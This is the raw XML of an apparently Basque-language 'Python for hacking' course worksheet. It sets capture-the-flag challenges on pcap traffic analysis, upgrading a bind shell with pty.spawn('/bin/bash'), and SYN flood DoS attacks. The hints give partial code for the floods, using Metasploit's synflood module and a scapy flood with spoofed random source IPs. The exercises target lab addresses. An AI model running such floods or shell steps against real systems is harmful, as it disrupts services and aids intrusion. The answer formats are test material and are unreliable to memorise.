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11" w:rsidRPr="003B6899" w:rsidRDefault="00467B11" w:rsidP="00467B1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t>ERRONKA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="auto"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00467B11" w:rsidRPr="003B6899" w:rsidRDefault="00467B11" w:rsidP="00467B11">
      <w:pPr>
        <w:pStyle w:val="Textoindependiente"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003B6899">
        <w:rPr>
          <w:b/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Er1-UD</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>4-Trafikoa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467B11" w:rsidRPr="00021D41" w:rsidRDefault="00C81428" w:rsidP="00467B11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BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>Lortu egin dugu makina batzuen ahuleziak ustiatzea, eta orain ustiapen osteko hainbat eratako ekintzei ekingo diegu.</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">Hasteko, pcap fitxategi batekin egin duzu topo. Ba al dago </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>informazio</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r w:rsidR="00467B11">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>sanguratsurik</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00467B11">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00467B11">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>lortzea</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00467B11">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00467B11">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>bertatik</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00467B11">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>?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Mugarriak</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003749A9" w:rsidRPr="00467B1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467B11">
        <w:rPr>
          <w:b/>
          <w:color w:val="76923C" w:themeColor="accent3" w:themeShade="BF"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>Er1-UD4-Mug1: 15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ordutan jaso genuen Kali makinaranzko lehenengo ICMP paketea 192.168.1.150 IPtik?</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t>Erabili Er1_UD4_Trafikoa_Bat.py scripta</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t>ERANTZUNAREN FORMATUA: hh:mm:ss</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003749A9" w:rsidRPr="00467B1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467B11">
        <w:rPr>
          <w:b/>
          <w:color w:val="76923C" w:themeColor="accent3" w:themeShade="BF"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>Er1-UD4-Mug2: 15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Inprimatu pantailan 45.33.32.156 IPko 80 atakaranzko paketeak. </w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t>Zein da  442 zenbakidun paketearen luzera?</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t>Erabili Er1_UD4_Trafikoa_Bi.py scripta.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003749A9" w:rsidRPr="00467B1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467B11">
        <w:rPr>
          <w:b/>
          <w:color w:val="76923C" w:themeColor="accent3" w:themeShade="BF"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>Er1-UD4-Mug3: 20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Inprimatu pantailan kali makinatik 22 atakaranzko paketeak. </w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t>Zein da  430 zenbakidun paketearen helburu-IPa?</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t>Erabili Er1_UD4_Trafikoa_Hiru.py scripta.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Er1-UD4-Mug1-Pista1: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conversaciones = []</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">       #Iteramos por cada elemento de la captura</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">       for paquete in captura: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Er1-UD4-Mug1-Pista2: -6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resultado = conversacion_red(???????)</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">              #Si el string "resultado" no está vacío</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">              if resultado is not None:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">                 #Añadimos el string a la lista "conversaciones"</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">                 conversaciones.append(???????)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Er1-UD4-Mug2-Pista 1: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</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>captura</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>pyshark.FileCapture</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>ruta_fichero</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">      </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>conversaciones</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> = []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</w:r>
      <w:r w:rsidRPr="00467B11">
        <w:rPr>
          <w:b/>
          <w:color w:val="943634" w:themeColor="accent2" w:themeShade="BF"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">Er1-UD4-Mug2-Pista2: -6 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00467B11">
        <w:rPr>
          <w:b/>
          <w:color w:val="943634" w:themeColor="accent2" w:themeShade="BF"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>puntu</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="003749A9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BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">              if direccion_ip==paquete.ip.dst and int(puerto_usuario)==int(paquete["TCP"].dstport):</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">                     resultado=conversacion_red(??????)</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">                    conversaciones.append(???????) </w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00467B11" w:rsidRPr="00467B11" w:rsidRDefault="00467B11">
      <w:pPr>
        <w:pStyle w:val="Textoindependiente"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="943634" w:themeColor="accent2" w:themeShade="BF"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00467B11" w:rsidRDefault="00467B11">
      <w:pPr>
        <w:pStyle w:val="Textoindependiente"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="943634" w:themeColor="accent2" w:themeShade="BF"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pP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 xml:space="preserve">Er1-UD4-Mug3-Pista1: -5 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00467B11">
        <w:rPr>
          <w:b/>
          <w:color w:val="943634" w:themeColor="accent2" w:themeShade="BF"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>puntu</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/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"main"-en:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t>captura = rdpcap(????)</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t>analizar_paquetes(xxx,yyyy,zzzz)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Er1-UD4-Mug3-Pista2: -7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if ip.src == ip_src and tcp.dport == int(puerto_dst):</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">                fecha_hora = paquete.????</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">                fecha_hora_str = time.strftime("%d-%m-%Y %H:%M:%S", time.localtime(int(fecha_hora)))</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">                destino=ip.????</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00467B11" w:rsidRDefault="00467B11">
      <w:pPr>
        <w:rPr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:rsidR="00467B11" w:rsidRPr="003B6899" w:rsidRDefault="00467B11" w:rsidP="00467B1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467B11" w:rsidRPr="003B6899" w:rsidRDefault="00467B11" w:rsidP="00467B11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Er2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4-Egonkortu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Aurreko fasean "BIND Shell" delakoa jarri genuen martxan, baina lortutako shell-aren propmt-a ez zen eguneratzen. Lortuko ahal duzu Prompt-a aldatzea kokatuta gauden direktorioaren arabera?</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/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467B1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467B11">
        <w:rPr>
          <w:b/>
          <w:color w:val="76923C" w:themeColor="accent3" w:themeShade="BF"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>Er2-UD4-Mug1: 10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Lortu 192.168.1.150 makinaren kontrola Bind Shell baten bidez. </w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t>Zer karaktere-kate ikusten da promptean "cd .." komandoa exekutatu eta gero?</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">ERANTZUNAREN ADIBIDEA: </w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t>root@webserver:/home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Oharra: Ez idatzi "#" karakterea!!!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Er2-UD4-Mug1-Pista1: -7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proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>pty.spawn</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>("/bin/bash")</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00467B11" w:rsidRDefault="00467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6"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00467B11" w:rsidRPr="003B6899" w:rsidRDefault="00467B11" w:rsidP="00467B1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467B11" w:rsidRPr="003B6899" w:rsidRDefault="00467B11" w:rsidP="00467B11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Er3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4-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>DOS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192.168.1.200 IPan web gune bat dugu atzigarri. Segurtatua egongo al da DOS erasoen kontra?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467B1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467B11">
        <w:rPr>
          <w:b/>
          <w:color w:val="76923C" w:themeColor="accent3" w:themeShade="BF"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>Er3-UD4-Mug1: 15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Exekutatu DOS eraso bat 192.168.1.200 IPko 80 atakaren kontra. </w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">Erabili Er3_UD4_DOS_Bat.py scripta. </w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t>Begiratu trafikoa WireShark-en.</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">Ordenatu atalak esaldi zuzen gehien duenetik gutxien duenera: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a)  Web guneak atzigarri egoteari utzi dio; SYN pakete guztien jatorrizko IPa Kalirena da. Pakete guztien luzera 0 baino handiagoa da</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>. .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">b)  Web guneak atzigarri jarraitzen du etengabe; SYN paketeen jatorrizko IPak aldakorrak dira. Paketeen luzera 0 baino handiagoa da. </w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">c)  Web guneak atzigarri egoteari utzi dio; SYN pakete guztien jatorrizko IPa berbera da, baina ez Kalirena. Paketeen luzera 0 da. </w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">d)  Web guneak atzigarri egoteari utzi dio; SYN paketeen jatorrizko IPak aldakorrak dira. Paketeen luzera 0 da.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Emaitzaren formatua: abcd</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w:rsidR="003749A9" w:rsidRPr="00467B1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467B11">
        <w:rPr>
          <w:b/>
          <w:color w:val="76923C" w:themeColor="accent3" w:themeShade="BF"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>Er3-UD4-Mug2: 25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Exekutatu DOS eraso bat 192.168.1.200 IPko 80 atakaren kontra. </w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">Erabili Er3_UD4_DOS_Bi.py scripta. </w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t>Begiratu trafikoa WireShark-en.</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">Ordenatu atalak esaldi zuzen gehien duenetik gutxien duenera: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a)  Web guneak atzigarri egoteari utzi dio; SYN pakete guztien jatorrizko IPa Kalirena da. Pakete guztien luzera 0 baino handiagoa da. </w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">b)  Web guneak atzigarri jarraitzen du etengabe; SYN paketeen jatorrizko IPa berbera da. Paketeen luzera 0 baino handiagoa da. </w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">c)  Web guneak atzigarri egoteari utzi dio; SYN pakete guztien jatorrizko IPa berbera da, baina ez Kalirena. Paketeen luzera 0 da. </w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">d)  Web guneak atzigarri egoteari utzi dio; SYN paketeen jatorrizko IPak aldakorrak dira. Paketeen luzera 0 da. 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Er3-UD4-Mug1-Pista1: -1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p,puerto_rpc,contrasena=solicitar_datos_usuario()</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/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Er3-UD4-Mug1-Pista2: -5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cliente_rpc = MsfRpcClient(contrasena, port=int(puerto_rpc))</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t>exploit = cliente_rpc.modules.use('auxiliary', 'dos/tcp/synflood')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Er3-UD4-Mug1-Pista3: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 exploit.execute()</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        time.sleep(2)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lastRenderedPageBreak/>
        <w:t xml:space="preserve">        print("Se está efectuando el SYN Flood")</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        input("Pulsa una tecla para detenerlo")</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        cliente_rpc.logout()</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/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Er3-UD4-Mug2-Pista3: -6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 paquete_TCP.sport = puerto_origen</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        paquete_TCP.dport = puerto_destino</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        paquete_TCP.flags = "S"</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        paquete_TCP.seq = secuencia</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        paquete_TCP.window = win    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Er3-UD4-Mug2-Pista2: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paquete_IP.src = obtener_IP_aleatoria()</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        paquete_IP.dst = ip_destino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Er3-UD4-Mug2-Pista1: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 puerto_origen = obtener_entero_aleatorio()</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        secuencia= obtener_entero_aleatorio()</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        win = obtener_entero_aleatorio()</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003749A9" w:rsidRPr="00467B1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467B11">
        <w:rPr>
          <w:b/>
          <w:color w:val="943634" w:themeColor="accent2" w:themeShade="BF"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>Er3-UD4-Mug2-Pista4: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ip_usuario,puerto_usuario=solicitar_datos_usuario()</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  numero_paquetes = input ("¿Cuántos paquetes quieres enviar?: ")</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  print("Se está efectuando el SYN Flood")</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB0425">
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  SYN_Flood(ip_usuario, int(puerto_usuario),int(numero_paquetes))     </w:t>
      </w:r>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="0"/>
    </w:p>
    <w:sectPr w:rsidR="003749A9" w:rsidRPr="00BB042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EBE" w:rsidRDefault="00FA4EBE" w:rsidP="00187FDE">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="00FA4EBE" w:rsidRDefault="00FA4EBE" w:rsidP="001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EBE" w:rsidRDefault="00FA4EBE" w:rsidP="00187FDE">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="00FA4EBE" w:rsidRDefault="00FA4EBE" w:rsidP="0018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FDE" w:rsidRDefault="00187FDE" w:rsidP="00187FDE">
    <w:pPr>
      <w:pStyle w:val="Encabezado"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:r>
      <w:t>TKNIKA 2022-2023</w:t>
    </w:r>
  </w:p>
  <w:p w:rsidR="00187FDE" w:rsidRDefault="00187FDE" w:rsidP="00187FDE">
    <w:pPr>
      <w:pStyle w:val="Encabezado"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:r>
      <w:t xml:space="preserve">“Python </w:t>
    </w:r>
    <w:proofErr w:type="spellStart"/>
    <w:r>
      <w:t>hackinerako</w:t>
    </w:r>
    <w:proofErr w:type="spellEnd"/>
    <w:r>
      <w:t xml:space="preserve">” </w:t>
    </w:r>
    <w:proofErr w:type="spellStart"/>
    <w:r>
      <w:t>ikastaroa</w:t>
    </w:r>
    <w:proofErr w:type="spellEnd"/>
  </w:p>
  <w:p w:rsidR="00187FDE" w:rsidRPr="00191397" w:rsidRDefault="00187FDE" w:rsidP="00187FDE">
    <w:pPr>
      <w:pStyle w:val="Encabezado"/>
      <w:jc w:val="center"/>
      <w:rPr>
        <w:b/>
      </w:rPr>
    </w:pPr>
